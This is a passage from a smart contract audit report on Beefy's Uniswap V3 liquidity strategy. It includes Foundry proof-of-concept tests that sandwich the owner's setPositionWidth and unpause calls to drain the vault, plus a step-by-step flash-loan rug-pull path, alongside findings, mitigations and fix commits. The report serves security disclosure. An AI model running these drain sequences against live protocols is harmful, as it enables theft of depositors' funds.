        uint256 ATTACKER_USDC = 100000000e6;
        trade(attacker, true, false, ATTACKER_USDC);

        // owner calls `StrategyPassiveManagerUniswap::setPositionWidth`
        // This is the transaction that the attacker sandwiches. The reason is that
        // `setPositionWidth` makes Beefy change its LP position. This will
        // cause Beefy to deploy its USDC at the now much higher price range
        strategy.setPositionWidth(width);

        // attacker back-runs the sandwiched transaction to sell their WBTC
        // to Beefy who has deployed their USDC at the inflated price range,
        // and also sells the rest of their WBTC position to the remaining LPs
        // unwinding the front-run transaction
        //
        // Attacker has forced Beefy to buy WBTC "high"
        trade(attacker, false, true, IERC20(token0).balanceOf(attacker));

        // record beefy WBTC & USDC amounts after attack
        (uint256 beefyAfterWBTCBal, uint256 beefyAfterUSDCBal) = strategy.balances();

        // beefy has been almost completely drained of WBTC & USDC
        console.log("%s  : %d", "LP WBTC After Attack", beefyAfterWBTCBal); // 2
        console.log("%s  : %d", "LP USDC After Attack", beefyAfterUSDCBal); // 0
        console.log();

        uint256 attackerUsdcBal = IERC20(token1).balanceOf(attacker);
        console.log("%s  : %d", "Attacker USDC profit", attackerUsdcBal-ATTACKER_USDC);

        // attacker original USDC: 100000000 000000
        // attacker now      USDC: 101244330 209974
        // attacker profit = $1,244,330 USDC
    }

    function test_AttackerDrainsProtocolViaUnpause() public {
        // user deposits and beefy sets up its LP position
        uint256 BEEFY_INIT_WBTC = 0;
        uint256 BEEFY_INIT_USDC = 600000e6;
        deposit(user, true, BEEFY_INIT_WBTC, BEEFY_INIT_USDC);

        // owner pauses contract
        strategy.panic(0, 0);

        (uint256 beefyBeforeWBTCBal, uint256 beefyBeforeUSDCBal) = strategy.balances();

        // record beefy WBTC & USDC amounts before attack
        console.log("%s : %d", "LP WBTC Before Attack", beefyBeforeWBTCBal); // 0
        console.log("%s : %d", "LP USDC Before Attack", beefyBeforeUSDCBal); // 599999999999
        console.log();

        // owner decides to unpause contract
        //
        // attacker front-runs owner call to `unpause` using
        // a large amount of USDC to buy all the WBTC. This:
        // massively pushes up the price of WBTC
        uint256 ATTACKER_USDC = 100000000e6;
        trade(attacker, true, false, ATTACKER_USDC);

        // owner calls `StrategyPassiveManagerUniswap::unpause`
        // This is the transaction that the attacker sandwiches. The reason is that
        // `unpause` makes Beefy change its LP position. This will
        // cause Beefy to deploy its USDC at the now much higher price range
        strategy.unpause();

        // attacker back-runs the sandwiched transaction to sell their WBTC
        // to Beefy who has deployed their USDC at the inflated price range,
        // and also sells the rest of their WBTC position to the remaining LPs
        // unwinding the front-run transaction
        //
        // Attacker has forced Beefy to buy WBTC "high"
        trade(attacker, false, true, IERC20(token0).balanceOf(attacker));

        // record beefy WBTC & USDC amounts after attack
        (uint256 beefyAfterWBTCBal, uint256 beefyAfterUSDCBal) = strategy.balances();

        // beefy has been almost completely drained of USDC
        console.log("%s  : %d", "LP WBTC After Attack", beefyAfterWBTCBal); // 0
        console.log("%s  : %d", "LP USDC After Attack", beefyAfterUSDCBal); // 126790
        console.log();

        uint256 attackerUsdcBal = IERC20(token1).balanceOf(attacker);
        console.log("%s  : %d", "Attacker USDC profit", attackerUsdcBal-ATTACKER_USDC);
        // attacker profit = $548,527 USDC
    }

    // handlers
    function deposit(address depositor, bool dealTokens, uint256 token0Amount, uint256 token1Amount) public {
        vm.startPrank(depositor);

        if(dealTokens) {
            deal(address(token0), depositor, token0Amount);
            deal(address(token1), depositor, token1Amount);
        }

        IERC20(token0).approve(address(vault), token0Amount);
        IERC20(token1).approve(address(vault), token1Amount);

        uint256 _shares = vault.previewDeposit(token0Amount, token1Amount);

        vault.depositAll(_shares);

        vm.stopPrank();
    }

    function trade(address trader, bool dealTokens, bool tokenInd, uint256 tokenAmount) public {
        vm.startPrank(trader);

        if(tokenInd) {
            if(dealTokens) deal(address(token0), trader, tokenAmount);

            IERC20(token0).approve(address(unirouter), tokenAmount);

            IUniswapRouterV3.ExactInputParams memory params = IUniswapRouterV3.ExactInputParams({
                path: tradePath1,
                recipient: trader,
                deadline: block.timestamp,
                amountIn: tokenAmount,
                amountOutMinimum: 0
            });
            IUniswapRouterV3(unirouter).exactInput(params);
        }
        else {
            if(dealTokens) deal(address(token1), trader, tokenAmount);

            IERC20(token1).approve(address(unirouter), tokenAmount);

            IUniswapRouterV3.ExactInputParams memory params = IUniswapRouterV3.ExactInputParams({
                path: tradePath2,
                recipient: trader,
                deadline: block.timestamp,
                amountIn: tokenAmount,
                amountOutMinimum: 0
            });
            IUniswapRouterV3(unirouter).exactInput(params);
        }

        vm.stopPrank();
    }

    // Convert token route to encoded path
    // uint24 type for fees so path is packed tightly
    function routeToPath(
        address[] memory _route,
        uint24[] memory _fee
    ) internal pure returns (bytes memory path) {
        path = abi.encodePacked(_route[0]);
        uint256 feeLength = _fee.length;
        for (uint256 i = 0; i < feeLength; i++) {
            path = abi.encodePacked(path, _fee[i], _route[i+1]);
        }
    }
}
```

Run with: `forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv`

**Recommended Mitigation:** Two options:
* add the `onlyCalmPeriods` modifier to `setPositionWidth` and `unpause`,
* alternatively add the `onlyCalmPeriods` modifier to `_setTicks` and remove it from other functions

The second option seems preferable because:
* it reduces the possibility of forgetting to put the modifier on one particular function
* it makes logical sense as the attack vector is having the protocol refresh its ticks from `pool.slot0` then deploying liquidity when the pool has been manipulated
* it prevents any intra-function pool manipulation; if the modifier is at the start of a long function there may be a possibility that another entity (such as a malicious pool) could hook execution control during one of the external function calls to manipulate the pool after the `onlyCalmPeriods` check has passed (at the beginning of the function) but before Beefy refreshes its ticks and deploys the liquidity.

**Beefy:**
Fixed in commit [2c5f4cb](https://github.com/beefyfinance/experiments/commit/2c5f4cb8d026bd7d4e842c993e032be507714b85) and [d7a7251](https://github.com/beefyfinance/experiments/commit/d7a7251270e678e536d017011afc3123d70f916b).

**Cyfrin:** Verified.

\clearpage
## High Risk


### No slippage parameter on UniswapV3 swaps can be exploited by MEV to return fewer output tokens

**Description:** `UniV3Utils::swap` performs a [swap](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/interfaces/exchanges/UniV3Utils.sol#L22) with `amountOutMinimum: 0`. This function is called by `StrategyPassiveManagerUniswap::_chargeFees` [L375](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L375), [L389](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L389) and `BeefyQIVault::_swapRewardsToNative` [L223](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/qidao/BeefyQIVault.sol#L223).

**Impact:** Due to the [lack of slippage parameter](https://dacian.me/defi-slippage-attacks#heading-no-slippage-parameter) an MEV attacker could sandwich attack the swap to return fewer output tokens to the protocol than would otherwise be returned. For `StrategyPassiveManagerUniswap` the reduced output tokens applies to the protocol's fees.

Whether the attack will be profitable or not will depend on the gas cost the attacker has to pay; it may well be that on L2s and Alt-L1s where Beefy intends to deploy, it will be profitable to exploit these swaps with the small pool manipulation `onlyCalmPeriods` may allow because the gas costs are so low.

Combined with a lack of effective deadline timestamp, malicious validators could also hold the swap transaction and execute it at a later time when it would return a reduced token amount than if it had been executed immediately. The `onlyCalmPeriods` check wouldn't appear to provide any protection against this since the swap would still be executed in a calm period, just at a later time when it would return less tokens than the caller expected when they called it.

The previous state could also arise organically due to a sudden and sustained spike in gas costs for example from a popular and prolonged NFT mint; the transaction could be organically delayed and executed at a later time resulting in a worse swap than would have occurred had it been executed when it was supposed to.

**Recommended Mitigation:** A valid slippage parameter [ideally calculated off-chain](https://dacian.me/defi-slippage-attacks#heading-on-chain-slippage-calculation-can-be-manipulated) should be passed to the swap.

**Beefy:**
Acknowledged - known issue. Problem lies in the price being manipulated and then harvest being called would still result in a bad trade even with slippage protections. We harvest frequently to make sure the viability of this attack is mitigated. Also this is only resulting in less fees for the protocol, not the users.

\clearpage
## Medium Risk


### `block.timestamp` used as swap deadline offers no protection

**Description:** `UniV3Utils::swap` performs a [swap](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/interfaces/exchanges/UniV3Utils.sol#L20) with `deadline: block.timestamp`. This function is called by `StrategyPassiveManagerUniswap::_chargeFees` [L375](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L375), [L389](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L389) and `BeefyQIVault::_swapRewardsToNative` [L223](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/qidao/BeefyQIVault.sol#L223).

**Impact:** The block the transaction is eventually put into will be `block.timestamp` so this [offers no protection](https://dacian.me/defi-slippage-attacks#heading-no-expiration-deadline).

**Recommended Mitigation:** Caller should pass in a desired deadline which should be passed to the swap as the deadline parameter.

**Beefy:**
Acknowledged - known issue.


### Native tokens permanently stuck in `StrategyPassiveManagerUniswap` contract due to rounding in `_chargeFees`

**Description:** `StrategyPassiveManagerUniswap::_chargeFees` converts LP fees into the native token then distributes the native tokens split between:
* the caller as a reward for initiating the harvest
* beefy protocol
* the strategist registered with the strategy

However due to [rounding during division](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L397-L404) some tokens are not distributed but instead accumulate inside the `StrategyPassiveManagerUniswap` contract where they are permanently stuck.

**Impact:** Fees will accumulate inside the `StrategyPassiveManagerUniswap` contract where they are permanently stuck. Although the amount each time is small the effect is cumulative, especially given that this protocol is intended to be deployed on the many blockchains where Beefy currently operates.

**Proof of Concept:** Add a new test file `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol`:
```solidity
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin-4/contracts/token/ERC20/ERC20.sol";
import {BeefyVaultConcLiq} from "contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol";
import {BeefyVaultConcLiqFactory} from "contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol";
import {StrategyPassiveManagerUniswap} from "contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol";
import {StrategyFactory} from "contracts/protocol/concliq/uniswap/StrategyFactory.sol";
import {StratFeeManagerInitializable} from "contracts/protocol/beefy/StratFeeManagerInitializable.sol";
import {IStrategyConcLiq} from "contracts/interfaces/beefy/IStrategyConcLiq.sol";
import {UniV3Utils} from "contracts/interfaces/exchanges/UniV3Utils.sol";

// Test WBTC/USDC Uniswap Strategy
contract ConLiqWBTCUSDCTest is Test {
    BeefyVaultConcLiq vault;
    BeefyVaultConcLiqFactory vaultFactory;
    StrategyPassiveManagerUniswap strategy;
    StrategyPassiveManagerUniswap implementation;
    StrategyFactory factory;
    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;
    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;
    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;
    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;
    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;
    int24 constant width = 500;
    address constant user = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;
    bytes tradePath1;
    bytes tradePath2;
    bytes path0;
    bytes path1;

    function setUp() public {
        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();
        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));
        vault = vaultFactory.cloneVault();
        implementation = new StrategyPassiveManagerUniswap();
        factory = new StrategyFactory(keeper);

        address[] memory lpToken0ToNative = new address[](2);
        lpToken0ToNative[0] = token0;
        lpToken0ToNative[1] = native;

        address[] memory lpToken1ToNative = new address[](2);
        lpToken1ToNative[0] = token1;
        lpToken1ToNative[1] = native;

        uint24[] memory fees = new uint24[](1);
        fees[0] = 500;

        path0 = routeToPath(lpToken0ToNative, fees);
        path1 = routeToPath(lpToken1ToNative, fees);

        address[] memory tradeRoute1 = new address[](2);
        tradeRoute1[0] = token0;
        tradeRoute1[1] = token1;

        address[] memory tradeRoute2 = new address[](2);
        tradeRoute2[0] = token1;
        tradeRoute2[1] = token0;

        tradePath1 = routeToPath(tradeRoute1, fees);
        tradePath2 = routeToPath(tradeRoute2, fees);

        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(
            address(vault),
            unirouter,
            keeper,
            strategist,
            beefyFeeRecipient,
            beefyFeeConfig
        );

        factory.addStrategy("StrategyPassiveManagerUniswap_v1", address(implementation));

        address _strategy = factory.createStrategy("StrategyPassiveManagerUniswap_v1");
        strategy = StrategyPassiveManagerUniswap(_strategy);
        strategy.initialize(
            pool,
            native,
            width,
            path0,
            path1,
            commonAddresses
        );

        // render calm check ineffective to allow deposit to work; not related to the
        // identified bug, for some reason (possibly block forking) the first deposit
        // was failing due to the calm check
        strategy.setTwapInterval(1);

        vault.initialize(address(strategy), "Moo Vault", "mooVault");
    }

    function test_StrategyAccumulatesNativeFeeTokensDueToRounding() public {
        // strategy has no native tokens
        assertEq(IERC20(native).balanceOf(address(strategy)), 0);

        // fuzzer has no native tokens
        assertEq(IERC20(native).balanceOf(address(this)), 0);

        // user deposits a large amount; Beefy will use this
        // to establish an LP position to start earning fees
        deposit(100e8, 6000000e6);

        // user performs a couple of trades between BTC/USDC
        // this will generate LP fees
        trade(true, 3e8);
        trade(false, 123457e6);

        // trigger a Beefy harvest; this will collect the LP
        // fees, convert them into native tokens then distribute
        // all the converted native tokens between:
        // * this contract as the caller of the harvest
        // * beefy
        // * the strategist registered with the strategy
        skip(10 hours);
        strategy.harvest(address(this));

        // verify that this contract has received some LP fees
        // converted into native tokens
        assert(IERC20(native).balanceOf(address(this)) > 0);

        // none of the native tokens that were converted from the
        // collected fees should remain in strategy contract
        // this fails due to rounding during division in
        // `StrategyPassiveManagerUniswap::_chargeFees` which will
        // result in native tokens converted from fees accumulating
        // and being permanently stuck in the strategy contract
        assertEq(IERC20(native).balanceOf(address(strategy)), 0);
    }

    function deposit(uint256 token0Amount, uint256 token1Amount) public {
        vm.startPrank(user);

        deal(address(token0), user, token0Amount);
        deal(address(token1), user, token1Amount);

        IERC20(token0).approve(address(vault), token0Amount);
        IERC20(token1).approve(address(vault), token1Amount);

        uint _shares = vault.previewDeposit(token0Amount, token1Amount);

        vault.depositAll(_shares);

        vm.stopPrank();
    }

    function trade(bool tokenInd, uint256 tokenAmount) public {
        vm.startPrank(user);

        if(tokenInd) {
            deal(address(token0), user, tokenAmount);

            IERC20(token0).approve(address(unirouter), tokenAmount);
            UniV3Utils.swap(unirouter, tradePath1, tokenAmount);
        }
        else {
            deal(address(token1), user, tokenAmount);

            IERC20(token1).approve(address(unirouter), tokenAmount);
            UniV3Utils.swap(unirouter, tradePath2, tokenAmount);
        }

        vm.stopPrank();
    }

    // Convert token route to encoded path
    // uint24 type for fees so path is packed tightly
    function routeToPath(
        address[] memory _route,
        uint24[] memory _fee
    ) internal pure returns (bytes memory path) {
        path = abi.encodePacked(_route[0]);
        uint256 feeLength = _fee.length;
        for (uint256 i = 0; i < feeLength; i++) {
            path = abi.encodePacked(path, _fee[i], _route[i+1]);
        }
    }
}
```

Run with: `forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth -vv`

**Recommended Mitigation:** Refactor `StrategyPassiveManagerUniswap::_chargeFees` to distribute whatever remains to the Beefy protocol:
```solidity
uint256 callFeeAmount = nativeEarned * fees.call / DIVISOR;
IERC20Metadata(native).safeTransfer(_callFeeRecipient, callFeeAmount);

uint256 strategistFeeAmount = nativeEarned * fees.strategist / DIVISOR;
IERC20Metadata(native).safeTransfer(strategist, strategistFeeAmount);

uint256 beefyFeeAmount = nativeEarned - callFeeAmount - strategistFeeAmount;
IERC20Metadata(native).safeTransfer(beefyFeeRecipient, beefyFeeAmount);
```

**Beefy:**
Fixed in commit [86c7de5](https://github.com/beefyfinance/experiments/commit/86c7de5fc00c2f8260dd729e929d2975a770e9e5).

**Cyfrin:** Verified.


### `StrategyPassiveManagerUniswap` gives ERC20 token allowances to `unirouter` but doesn't remove allowances when `unirouter` is updated

**Description:** `StrategyPassiveManagerUniswap` gives ERC20 token [allowances](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L745-L748) to `unirouter`:
```solidity
function _giveAllowances() private {
    IERC20Metadata(lpToken0).forceApprove(unirouter, type(uint256).max);
    IERC20Metadata(lpToken1).forceApprove(unirouter, type(uint256).max);
}
```

`unirouter` is inherited from `StratFeeManagerInitializable` which has an external function `setUnirouter` which allows `unirouter` to be [changed](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/beefy/StratFeeManagerInitializable.sol#L127-L130):
```solidity
 function setUnirouter(address _unirouter) external onlyOwner {
    unirouter = _unirouter;
    emit SetUnirouter(_unirouter);
}
```

The allowances can only be removed by [calling](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L726-L729) `StrategyPassiveManagerUniswap::panic` however `unirouter` can be changed any time via the `setUnirouter` function.

This allows the contract to enter a state where `unirouter` is updated via `setUnirouter` but the ERC20 token approvals given to the old `unirouter` are not removed.

**Impact:** The old `unirouter` contract will continue to have ERC20 token approvals for `StratFeeManagerInitializable` so it can continue to spend the protocol's tokens when this is not the protocol's intention as the protocol has changed `unirouter`.

**Recommended Mitigation:** 1) Make `StratFeeManagerInitializable::setUnirouter` `virtual` such that it can be overridden by child contracts.
2) `StrategyPassiveManagerUniswap` should override `setUnirouter` to remove all allowances before calling the parent function to update `unirouter`.

**Beefy:**
Fixed in commit [8fd397f](https://github.com/beefyfinance/experiments/commit/8fd397f54a47c6f305721335b00896938cec13fe).

**Cyfrin:** Verified.


### Update to `StratFeeManagerInitializable::beefyFeeConfig` retrospectively applies new fees to pending LP rewards yet to be claimed

**Description:** The fee configuration `StratFeeManagerInitializable::beefyFeeConfig` can be updated via `StratFeeManagerInitializable::setBeefyFeeConfig` [L164-167](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/beefy/StratFeeManagerInitializable.sol#L164-L167) while LP rewards are collected and fees charged via `StrategyPassiveManagerUniswap::_harvest` [L306-311](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L306-L311).

This allows the protocol to enter a state where the fee configuration is updated to for example increase Beefy's protocol fees, then the next time `harvest` is called the higher fees are retrospectively applied to the LP rewards that were pending under the previously lower fee regime.

**Impact:** The protocol owner can retrospectively alter the fee structure to steal pending LP rewards instead of distributing them to protocol users; the retrospective application of fees is unfair on protocol users because those users deposited their liquidity into the protocol and generated LP rewards at the previous fee levels.

**Recommended Mitigation:** 1) `StratFeeManagerInitializable::setBeefyFeeConfig` should be declared virtual
2) `StrategyPassiveManagerUniswap` should override it and before calling the parent function, first call `_claimEarnings` then `_chargeFees`

This ensures that pending LP rewards are collected and have the correct fees charged on them, and only after that has happened is the new fee structure updated.

**Beefy:**
Acknowledged.

\clearpage
## Low Risk


### Missing storage gap in `StratFeeManagerInitializable` can lead to upgrade storage slot collision

**Description:** `StratFeeManagerInitializable` is a stateful [upgradeable](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/beefy/StratFeeManagerInitializable.sol#L9) contract with no storage gaps and has [1 child](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L18) with its own state `StrategyPassiveManagerUniswap`.

**Impact:** Should an upgrade occur where the `StratFeeManagerInitializable` contract has additional state added to storage, a storage collision can occur where storage within the child contract `StrategyPassiveManagerUniswap` is overwritten.

**Recommended Mitigation:** Add a storage gap to the `StratFeeManagerInitializable` contract per the OpenZeppelin [documentation](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#storage-gaps).

**Beefy:**
Fixed in commit [2143322](https://github.com/beefyfinance/experiments/commit/2143322ea2c73a6680675627a0777881cbd4440a).

**Cyfrin:** Verified.


### Upgradeable contracts don't call `disableInitializers`

**Description:** The codebase has a number of upgradeable contracts which use OpenZeppelin Initializable but don't have a constructor which calls `_disableInitializers` per the OpenZeppelin documentation [[1](https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable-_disableInitializers--), [2](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing_the_implementation_contract)].

**Impact:** Contract implementations could be initialized when this should not be possible.

**Recommended Mitigation:** All upgradeable contracts should have a constructor like this:
```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

**Beefy:**
Fixed in commit [4009179](https://github.com/beefyfinance/experiments/commit/4009179059190b782c63d022d310d14cb18f7781).

**Cyfrin:** Verified.


### Owner of `StrategyPassiveManagerUniswap` can rug-pull users' deposited tokens by manipulating `onlyCalmPeriods` parameters

**Description:** While `StrategyPassiveManagerUniswap` does have some permissioned roles, one of the attack paths we were asked to check was that the permissioned roles could not rug-pull the users' deposited tokens. There is a way that the owner of the `StrategyPassiveManagerUniswap` contract could accomplish this by modifying key parameters to reduce the effectiveness of the `_onlyCalmPeriods` check. This appears to be how a similar protocol Gamma was [exploited](https://rekt.news/gamma-strategies-rekt/).

**Proof of Concept:**
1. Owner calls `StrategyPassiveManagerUniswap::setDeviation` to increase the maximum allowed deviations to large numbers or alternatively `setTwapInterval` to decrease the twap interval rendering it ineffective
2. Owner takes a flash loan and uses it to manipulate `pool.slot0` to a high value
3. Owner calls `BeefyVaultConcLiq::deposit` to perform a deposit; the shares are calculated thus:
```solidity
// @audit `price` is derived from `pool.slot0`
shares = _amount1 + (_amount0 * price / PRECISION);
```
4. As `price` is derived from `pool.slot0` which has been inflated, the owner will receive many more shares than they normally would
5. Owner unwinds the flash loan returning `pool.slot0` back to its normal value
6. Owner calls `BeefyVaultConcLiq::withdraw` to receive many more tokens than they should be able to due to the inflated share count they received from the deposit

**Impact:** Owner of `StrategyPassiveManagerUniswap` can rug-pull users' deposited tokens.

**Recommended Mitigation:** Beefy already intends to have all owner functions behind a timelocked multi-sig and if these transactions are attempted the suspicious parameters would be an obvious signal that a future attack is coming. Because of this the probability of this attack being effectively executed is low though it is still possible.

One way to further mitigate this attack would be to have a minimum required twap interval and maximum required deviation amounts such that the owner couldn't change these parameters to values which would enable this attack.

**Beefy:**
Fixed in commit [b5769c4](https://github.com/beefyfinance/experiments/commit/b5769c4ccad6357ac9d3de2c682749bbaeeae6d1).

**Cyfrin:** Verified.


### `_onlyCalmPeriods` does not consider MIN/MAX ticks, which can DOS deposit, withdraw and harvest in edge cases

**Description:** In Uniswap V3 liquidity providers can only provide liquidity between price ranges `[1.0001^{MIN_ TICK};1.0001^{MAX_TICK})`. Therefore these are the min and max prices.

```solidity
    function _onlyCalmPeriods() private view {
        int24 tick = currentTick();
        int56 twapTick = twap();

        if(
            twapTick - maxTickDeviationNegative > tick  ||
            twapTick + maxTickDeviationPositive < tick) revert NotCalm();
    }
```

If `twapTick - maxTickDeviationNegative < MIN_TICK`, this function would revert even if `tick` has been the same for years. This can DOS deposits, withdrawals and harvests when they should be allowed for as long as the state holds.

**Recommended Mitigation:** Consider changing the current implementation to:

```diff
+   const int56 MIN_TICK = -887272;
+   const int56 MAX_TICK = 887272;
    function _onlyCalmPeriods() private view {
        int24 tick = currentTick();
        int56 twapTick = twap();

+       int56 minCalmTick = max(twapTick - maxTickDeviationNegative, MIN_TICK);
+       int56 maxCalmTick = min(twapTick - maxTickDeviationPositive, MAX_TICK);

        if(
-           twapTick - maxTickDeviationNegative > tick  ||
-           twapTick + maxTickDeviationPositive < tick) revert NotCalm();
+           minCalmTick > tick  ||
+           maxCalmTick < tick) revert NotCalm();
    }
```

**Beefy:**
Fixed in commit [b5432d2](https://github.com/beefyfinance/experiments/commit/b5432d2c73f071f08ab34efcc570605f64808d38).

**Cyfrin:** Verified.


### `StrategyPassiveManagerUniswap::withdraw` should call `_setTicks` before calling `_addLiquidity`

**Description:** When a withdraw is initiated, `BeefyVaultConcLiq::withdraw` [calls](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L213) `StrategyPassiveManagerUniswap::beforeAction` which removes the liquidity.

In 4 other places when liquidity has been removed, `_setTicks` is always called immediately before calling `_addLiquidity` [[1](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L181-L182), [2](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L315-L316), [3](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L717-L718), [4](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L740-L741)].

This pattern does not occur inside `StrategyPassiveManagerUniswap::withdraw` [L204](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L204) where liquidity gets removed but then `_setTicks` is not called before adding liquidity again.

Consider the following scenario:

1. Beefy sets their LP position based on the current tick
2. Other users transact in the Uniswap pool moving the current liquidity range possibly even outside of Beefy's LP range
3. Someone interacts with Beefy protocol. On almost every interaction Beefy removes their liquidity, gets the current tick and deploys its new liquidity range calculated off the current tick.
4. But on withdrawals Beefy would remove its liquidity but then deploy its new liquidity range using the old stored current tick data since it doesn't fetch the new current tick.

In the above scenario could Beefy deploy its new LP range in an area where it wouldn't get any rewards since the actual current range moved outside it due the activity of other users.

**Impact:** Whenever withdrawals occur the newly added liquidity can be based off a stale current tick. The most likely result of this is reduced liquidity provider rewards due to a non-optimal LP position.

**Recommended Mitigation:** `StrategyPassiveManagerUniswap::withdraw` should call `_setTicks` before calling `_addLiquidity`.

**Beefy:**
We chose to remove the `_onlyCalmPeriods` check from `withdraw` in commit [be0f1ea](https://github.com/beefyfinance/experiments/commit/be0f1eac6944d6f8f73d74a8c3ec80ae3bc3d089) to allow users to withdraw at any time. Hence we don't want withdraw to be able to set ticks so that a malicious actor can't force us to deploy liquidity into an unfavorable range.


### First depositor can massively inflate their share count by recycling deposits and withdrawals

**Description:** The first depositor can massively inflate their share count by recycling deposits and withdrawals.

**Impact:** The first depositor will have a massively inflated share count. However a subsequent depositor will also end up with a large share count, so we haven't found a way to exploit this to steal tokens from subsequent depositors.

**Proof of Concept:** Add a new test file `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol:`
```solidity
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin-4/contracts/token/ERC20/ERC20.sol";
import {BeefyVaultConcLiq} from "contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol";
import {BeefyVaultConcLiqFactory} from "contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol";
import {StrategyPassiveManagerUniswap} from "contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol";
import {StrategyFactory} from "contracts/protocol/concliq/uniswap/StrategyFactory.sol";
import {StratFeeManagerInitializable} from "contracts/protocol/beefy/StratFeeManagerInitializable.sol";
import {IStrategyConcLiq} from "contracts/interfaces/beefy/IStrategyConcLiq.sol";
import {UniV3Utils} from "contracts/interfaces/exchanges/UniV3Utils.sol";

// Test WBTC/USDC Uniswap Strategy
contract ConLiqWBTCUSDCTest is Test {
    BeefyVaultConcLiq vault;
    BeefyVaultConcLiqFactory vaultFactory;
    StrategyPassiveManagerUniswap strategy;
    StrategyPassiveManagerUniswap implementation;
    StrategyFactory factory;
    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;
    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;
